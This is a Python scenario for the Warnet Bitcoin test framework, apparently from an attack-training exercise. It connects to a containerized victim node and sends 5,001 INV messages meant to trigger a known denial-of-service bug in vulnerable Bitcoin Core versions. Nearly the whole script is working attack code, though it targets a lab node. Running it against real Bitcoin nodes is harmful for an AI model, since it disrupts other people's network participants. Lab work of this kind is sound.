#!/usr/bin/env python3

import socket

from commander import Commander

# The entire Bitcoin Core test_framework directory is available as a library
from test_framework.messages import MSG_TX, CInv, msg_inv
from test_framework.p2p import P2PInterface

# The actual scenario is a class like a Bitcoin Core functional test.
# Commander is a subclass of BitcoinTestFramework instide Warnet
# that allows to operate on containerized nodes instead of local nodes.
class Inv5K(Commander):
    def set_test_params(self):
        # This setting is ignored but still required as
        # a sub-class of BitcoinTestFramework
        self.num_nodes = 1

    def add_options(self, parser):
        parser.description = (
            "Demonstrate INV attack using a scenario and P2PInterface"
        )
        parser.usage = "warnet run /path/to/my_first_attack_5kinv.py"

    # Scenario entrypoint
    def run_test(self):
        # get context from any node
        node = self.nodes[0]

        # We pick a node on the network to attack
        # We know this one is vulnderable to 5k inv messages based on it's subver
        # Change this to your teams colour if running in the battleground
        victim = "tank-0000-aqua.default.svc"

        # The victim's address could be an explicit IP address
        # OR a kubernetes hostname (use default chain p2p port)
        dstaddr = socket.gethostbyname(victim)

        # Now we will use a python-based Bitcoin p2p node to send very specific,
        # unusual or non-standard messages to a "victim" node.
        self.log.info(f"Attacking {victim}")
        attacker = P2PInterface()
        attacker.peer_connect(
            dstaddr=dstaddr, dstport=node.p2pport, net=node.chain, timeout_factor=1
        )()
        attacker.wait_until(lambda: attacker.is_connected, check_connected=False)

        msg = msg_inv([CInv(MSG_TX, 0x12345)])
        for i in range(5001):
            attacker.send_and_ping(msg)
            self.log.info(f"Sent inv message {i}")


def main():
    Inv5K().main()


if __name__ == "__main__":
    main()
